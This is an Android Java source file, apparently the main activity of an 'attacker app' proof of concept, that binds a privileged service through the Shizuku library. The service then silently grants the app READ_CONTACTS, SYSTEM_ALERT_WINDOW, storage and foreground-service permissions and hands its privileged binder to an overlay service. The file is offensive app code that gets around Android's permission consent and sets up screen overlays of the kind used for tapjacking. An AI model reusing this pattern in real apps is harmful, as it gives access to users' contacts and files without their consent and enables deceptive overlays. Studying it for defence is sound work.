package com.example.attackerappjava;

import android.annotation.SuppressLint;
import android.content.ComponentName;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import java.util.List;

import rikka.shizuku.Shizuku;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "[MainActivity]";
    private static final int SHIZUKU_PERMISSION_REQUEST_CODE = 1001;

    private boolean isShizukuConnected = false;
    private IUserService privilegedService; // Renamed for clarity
    private Shizuku.UserServiceArgs userServiceArgs;
    private TextView tvOutput;
    private Button btnRequestPermission;
    private Button btnRunCommand;
    private Button startOverlayService;
    private Button stopOverlayService;

    // This listener is called when the connection to the main Shizuku service is ready.
    @SuppressLint("SetTextI18n")
    private final Shizuku.OnBinderReceivedListener binderReceivedListener = () -> {
        isShizukuConnected = true;
        Log.d(TAG, "Shizuku Binder has been received. Enabling permission button.");
        runOnUiThread(() -> {
            btnRequestPermission.setEnabled(true);
            btnRequestPermission.setText("Request Permission");
            Toast.makeText(this, "Shizuku connected.", Toast.LENGTH_SHORT).show();
        });
    };

    @SuppressLint("SetTextI18n")
    private final Shizuku.OnBinderDeadListener binderDeadListener = () -> {
        isShizukuConnected = false;
        Log.w(TAG, "Shizuku Binder has died.");
        runOnUiThread(() -> {
            btnRequestPermission.setEnabled(false);
            btnRequestPermission.setText("Shizuku Disconnected");
            btnRunCommand.setEnabled(false);
            Toast.makeText(this, "Shizuku disconnected.", Toast.LENGTH_SHORT).show();
        });
    };

    // This listener is called AFTER you request permission and the user responds.
    private final Shizuku.OnRequestPermissionResultListener permissionListener = (requestCode, grantResult) -> {
        Log.d(TAG, "Permission result received. Request code: " + requestCode);
        if (requestCode == SHIZUKU_PERMISSION_REQUEST_CODE) {
            if (grantResult == PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "Shizuku permission has been granted.");
                bindPrivilegedService();
            } else {
                Log.w(TAG, "Shizuku permission was denied.");
                Toast.makeText(this, "Shizuku permission is required!", Toast.LENGTH_LONG).show();
            }
        }
    };

    // This listener is for YOUR OWN service, not the main Shizuku service.
    private final ServiceConnection userServiceConnection = new ServiceConnection() {
        @SuppressLint("SetTextI18n")
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            Log.d(TAG, "Our UserService is connected.");
            privilegedService = IUserService.Stub.asInterface(service);
            btnRunCommand.setEnabled(true);
            btnRequestPermission.setEnabled(false);
            btnRequestPermission.setText("Permission Granted");
            Toast.makeText(MainActivity.this, "User service connected.", Toast.LENGTH_SHORT).show();
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            Log.d(TAG, "Our UserService is disconnected.");
            privilegedService = null;
            btnRunCommand.setEnabled(false);
            if (isShizukuConnected) {
                btnRequestPermission.setEnabled(true); // Allow requesting again if needed
            }
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Log.d(TAG, "onCreate: App is starting.");

        tvOutput = findViewById(R.id.outputContainer);
        btnRunCommand = findViewById(R.id.cmdBtn);
        btnRequestPermission = findViewById(R.id.reqBtn);
        startOverlayService = findViewById(R.id.startOverlay);
        stopOverlayService = findViewById(R.id.stopOverlay);

        // **FIXED**: Listeners are now added only once.
        Shizuku.addBinderReceivedListenerSticky(binderReceivedListener);
        Shizuku.addBinderDeadListener(binderDeadListener);
        Shizuku.addRequestPermissionResultListener(permissionListener);

        btnRequestPermission.setOnClickListener(v -> requestShizukuPermission());
        btnRunCommand.setOnClickListener(v -> runPrivilegedCommand());
        startOverlayService.setOnClickListener(v -> fnStartOverlayService());
        stopOverlayService.setOnClickListener(v -> fnStopOverlayService());
    }

    private void requestShizukuPermission() {
        Log.d(TAG, "Attempting to request Shizuku permission...");
        if (!isShizukuConnected) {
            Toast.makeText(this, "Shizuku service is not yet connected. Please wait.", Toast.LENGTH_SHORT).show();
            return;
        }

        // **FIXED**: Logic is now outside the outdated version check.
        if (Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED) {
            Log.d(TAG, "Permission is already granted. Binding service...");
            bindPrivilegedService();
        } else if (Shizuku.shouldShowRequestPermissionRationale()) {
            Log.d(TAG, "Showing rationale and requesting permission...");
            Toast.makeText(this, "We need Shizuku permission to run commands.", Toast.LENGTH_LONG).show();
            Shizuku.requestPermission(SHIZUKU_PERMISSION_REQUEST_CODE);
        } else {
            Log.d(TAG, "Requesting permission...");
            Shizuku.requestPermission(SHIZUKU_PERMISSION_REQUEST_CODE);
        }
    }

    private void bindPrivilegedService() {
        if (privilegedService != null) {
            Log.d(TAG, "Not binding, service is already connected.");
            return;
        }
        Log.d(TAG, "Attempting to bind our UserService...");
        userServiceArgs = new Shizuku.UserServiceArgs(new ComponentName(this, UserService.class))
                .daemon(false)
                .processNameSuffix("privileged_process");

        Shizuku.bindUserService(userServiceArgs, userServiceConnection);
        Log.d(TAG, "Bound our UserService.");
    }

    @SuppressLint("SetTextI18n")
    private void runPrivilegedCommand() {
        Log.d(TAG, "RUNNING THE COMMAND FN....");
        if (privilegedService == null) {
            Toast.makeText(this, "User service not connected!", Toast.LENGTH_SHORT).show();
            return;
        }
        tvOutput.setText("Running command...");
        try {
            privilegedService.gatherPermission("SYSTEM_ALERT_WINDOW");
            privilegedService.gatherPermission("READ_CONTACTS");
            privilegedService.gatherPermission("POST_NOTIFICATIONS");
            privilegedService.gatherPermission("READ_EXTERNAL_STORAGE");
            privilegedService.gatherPermission("WRITE_EXTERNAL_STORAGE");
            privilegedService.gatherPermission("FOREGROUND_SERVICE");
            privilegedService.gatherPermission("FOREGROUND_SERVICE_SPECIAL_USE");
        } catch (RemoteException e) {
            Log.e(TAG, "RemoteException while executing privileged command", e);
            tvOutput.setText("Error: " + e.getMessage());
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "onDestroy: Cleaning up listeners and service connection.");
        if (privilegedService != null) {
            Shizuku.unbindUserService(userServiceArgs, userServiceConnection, true);
        }
        Shizuku.removeRequestPermissionResultListener(permissionListener);
        Shizuku.removeBinderReceivedListener(binderReceivedListener);
        Shizuku.removeBinderDeadListener(binderDeadListener);
    }


    private void fnStartOverlayService() {
        Intent intent = new Intent(this, OverlayService.class);
        Bundle extrasBundle = new Bundle();
        extrasBundle.putBinder("shizuku_privileged_service_binder_key_in_bundle", privilegedService.asBinder());
        intent.putExtras(extrasBundle);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startForegroundService(intent);
        Toast.makeText(this, "OverlayService started", Toast.LENGTH_SHORT).show();
    }

    private void fnStopOverlayService() {
        Intent intent = new Intent(this, OverlayService.class);
        stopService(intent);
        Toast.makeText(this, "OverlayService stopped", Toast.LENGTH_SHORT).show();
    }
}